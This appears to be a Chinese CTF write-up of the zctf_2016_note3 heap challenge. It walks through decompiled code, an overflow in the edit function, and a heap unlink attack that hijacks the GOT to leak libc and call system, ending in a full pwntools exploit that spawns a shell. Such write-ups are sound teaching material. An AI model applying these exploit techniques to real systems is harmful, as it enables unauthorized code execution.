# zctf_2016_note3 详解
https://blog.csdn.net/One_p_Two_w/article/details/121142272

题目可以在buu上找到，ibc版本为2.23

和wiki做的不一样，wiki那个我还没看懂，改天再研究研究orz

查看保护机制
```
[*] '/root/AutoExpMarkDocker/data/nolabel/zctf_2016_note3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

## 题目分析
是个菜单题，提供了新建note、打印note、编辑note、删除note四个功能
```c
while ( 1 )
  {
    switch ( sub_400A1B() )
    {
      case 1:
        sub_400A30();
        break;
      case 2:
        sub_400BFD();
        break;
      case 3:
        sub_400C0D();
        break;
      case 4:
        sub_400B33();
        break;
      case 5:
        puts("Bye~");
        exit(0);
      case 6:
        exit(0);
      default:
        continue;
    }
  }
```

## 添加note
​最多添加七个note，每个note大小在0-0x400之间，申请到的堆空间地址会放在ptr指针处
```c
int sub_400A30()
{
  int i; // [rsp+Ch] [rbp-14h]
  __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 6 && *(&ptr + i); ++i )
    ;
  if ( i == 7 )
    puts("Note is full, add fail");          //最多七个
  puts("Input the length of the note content:(less than 1024)");
  size = sub_4009B9();
  if ( size < 0 )
    return puts("Length error");
  if ( size > 1024 )                         //0x400
    return puts("Content is too long");
  v3 = malloc(size);
  puts("Input the note content:");
  sub_4008DD((__int64)v3, size, 10);
  *(&ptr + i) = v3;
  qword_6020C0[i + 8] = size;
  qword_6020C0[0] = (__int64)*(&ptr + i);
  return printf("note add success, the id is %d\n", i);
}
```

## 漏洞在edit功能模块
​当a2 = 0时，由于i为unsigned_int，-1相当于无穷大，会造成无限制读入，令我们可以覆盖后面的堆块
```c
unsigned __int64 __fastcall sub_4008DD(__int64 a1, __int64 a2, char a3)
{
  char buf; // [rsp+2Fh] [rbp-11h] BYREF
  unsigned __int64 i; // [rsp+30h] [rbp-10h]
  ssize_t v7; // [rsp+38h] [rbp-8h]

  for ( i = 0; a2 - 1 > i; ++i )
  {
    v7 = read(0, &buf, 1u);
    if ( v7 <= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(i + a1) = buf;
  }
  *(_BYTE *)(a1 + i) = 0;
  return i;
}
```

## show是假的
​另外需要注意的是show函数并没有实现打印功能，那么通过打印堆块内容泄露libc的办法就不可行了
```c
int sub_400BFD()
{
  return puts("No show, No leak.");
}
```

## delete
```c
int sub_400B33()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7;
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      free(*(&ptr + v3));
      if ( (void *)qword_6020C0[0] == *(&ptr + v3) )
        qword_6020C0[0] = 0;
      *(&ptr + v3) = 0;
      LODWORD(v1) = puts("Delete success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

## 整合思路
要做的事情有两个

1. 泄露libc
2. getshell

整合上面得到的信息，由于show函数并没有实现打印功能，那么通过fastbin attack打印fd泄露libc的办法就不可行了，不过我们注意到申请到的堆块指针全部放在ptr中，并且在delete函数中free对指针进行了直接操作，那么可以通过unlink挟持got表到ptr，之后通过打印got表和篡改got表来实现泄露和getshell

具体实现如下：

覆盖free为puts实现打印功能，通过unlink覆盖ptr为free_got表以及atoi_got表，然后通过edit 可以篡改free_got为puts_plt实现打印功能。

ptr已经被覆盖，我们可以直接打印atoi_got表中的函数地址来泄露libc，通过篡改atoi_got表为system来实现getshell

## unlink过程详解
我们首先申请0、0x100、0x100、0x100的堆块，如图左所示，记作chunk0-3

为了unlink我们需要一个假的空闲的堆块，这里选择在ptr[2]处进行伪造，我们希望free(ptr[1])造成chunk1和fake_chunk的合并

为了让glibc相信这个fake chunk就是chunk2，我们需要修改chunk1和chunk2的size，以及chunk3的prevsize

为了让glibc相信fake chunk是空闲的，需要修改chunk3的prev_inuse标志位

（其实不伪造的这么精致也可以，比如让fake_chunk只有0x70大，只要fake_chunk + 8位置的prev_inuse标志位能对上就行）
```python
payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 
payload += p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) 
payload += p64(0x100) + p64(0x110)
```

### True Chunk

| malloc Size | Chunk Size |
|-------------|------------|
| `malloc(0x0)`  | `0x20`     |
| `malloc(0x100)` | `0x110`    |
| `malloc(0x100)` | `0x110`    |
| `malloc(0x100)` | `0x110`    |

### Fake Chunk

| Segment          | Size   | Description                |
|------------------|--------|----------------------------|
| `fake_chunk`     | `0x110`|                            |
| `fake_bk`        | `0x101`|                            |
| `fake_fd`        | `0x0`  |                            |
| `ptr[2] (fake_chunk)` | `0x100` |                          |
|                  | `0x120`|                            |
| `0x121`          | `0x0`  |                            |
|                  | `0x20` |                            |

执行unlink之后，ptr[2] = ptr[2] - 0x18 = ptr - 0x8

之后编辑ptr[2]，就可以覆盖ptr区域存储的指针，就可以实现对got表的打印和修改了

## exp：
```python
from pwn import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

io = process('./zctf_2016_note3')
# io = remote('node4.buuoj.cn', 26242)
# gdb.attach(io)

elf = ELF('./zctf_2016_note3')
libc = ELF('./libc-2.23.so')

def new(size, content):
    io.recvuntil(b'>>\n')
    io.sendline(b'1')
    io.recvuntil(b'1024)\n')
    io.sendline(size)
    io.recvuntil(b'content:\n')
    io.sendline(content)

def show():
    io.recvuntil(b'>>\n')
    io.sendline(b'2')

def edit(idx, content):
    io.recvuntil(b'>>\n')
    io.sendline(b'3')
    io.recvuntil(b'note:\n')
    io.sendline(idx)
    io.recvuntil(b'content:\n')
    io.sendline(content)

def delete(idx):
    io.recvuntil(b'>>\n')
    io.sendline(b'4')
    io.recvuntil(b'note:\n')
    io.sendline(idx)

ptr = 0x6020C8

new(b'0', b'aaaa')      # idx 0
new(b'256', b'aaaa')    # idx 1
new(b'256', b'aaaa')    # idx 2
new(b'256', b'aaaa')    # idx 3
# delete(b'2')

# 伪造idx 2的free状态和fd bk
fd = ptr + 0x10 - 0x18
bk = ptr + 0x10 - 0x10

payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 
payload += p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) 
payload += p64(0x100) + p64(0x110)

edit(b'0', payload)

# 触发unlink，free(1)使1和2合并
delete(b'1')

free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

# 覆盖ptr里的堆地址
payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + p64(atoi_got) + p64(atoi_got)
edit(b'2', payload)

# 泄漏atoi_got
edit(b'0', p64(puts_plt)[:-1])
delete(b'2')
atoi_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
print('atoi_addr -> ' + hex(atoi_addr))

libc_addr = atoi_addr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + libc_addr

# 修改atoi_got为system地址
edit(b'3', p64(system_addr)[:-1])

io.recvuntil(b'>>\n')
io.sendline(b'/bin/sh')

io.interactive()
```